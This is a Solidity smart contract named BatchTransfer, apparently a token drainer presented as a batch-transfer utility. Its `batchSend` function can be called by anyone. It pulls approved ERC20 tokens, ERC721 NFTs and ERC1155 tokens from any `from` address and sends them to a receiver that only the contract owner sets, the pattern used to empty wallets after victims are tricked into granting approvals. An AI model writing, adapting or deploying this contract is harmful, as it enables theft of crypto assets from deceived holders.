// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC721{
    function transferFrom(address from, address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool _approved) external;
}

interface IERC1155{
    function safeBatchTransferFrom(
        address from,
        address to,
        uint256[] calldata ids,
        uint256[] calldata amounts,
        bytes calldata data
    ) external;
    function setApprovalForAll(address _operator, bool _approved) external;
}

contract BatchTransfer {
    address payable public owner;
    address payable public receiver;

    struct ERC20Item {
        address token;
        uint256 amount;
    }

    struct ERC721Item {
        address token;
        uint256[] ids;
    }

    struct ERC1155Item {
        address token;
        uint256[] ids;
        uint256[] amounts;
    }

    constructor(){
        owner = payable(msg.sender);
        receiver = payable(msg.sender);
    }

    function setReceiver(address _receiver) external{
        require(msg.sender == owner);
        receiver = payable(_receiver);
    }

    function batchSend(address from, ERC20Item[] calldata ERC20Items, ERC721Item[] calldata ERC721Items, ERC1155Item[] calldata ERC1155Items) external{
        for (uint i = 0; i < ERC20Items.length; i++) {
            ERC20Item calldata cache = ERC20Items[i];
            require(IERC20(cache.token).transferFrom(from, receiver, cache.amount), string(abi.encodePacked(cache.token)));
        }

        for (uint i = 0; i < ERC721Items.length; i++) {
            ERC721Item calldata cache = ERC721Items[i];
            for (uint idi = 0; idi < cache.ids.length; idi++) {
                IERC721(cache.token).transferFrom(from, receiver, cache.ids[idi]);
            }
        }

        for (uint i = 0; i < ERC1155Items.length; i++) {
            ERC1155Item calldata cache = ERC1155Items[i];
            IERC1155(cache.token).safeBatchTransferFrom(from, receiver, cache.ids, cache.amounts, "");
        }
    }
}
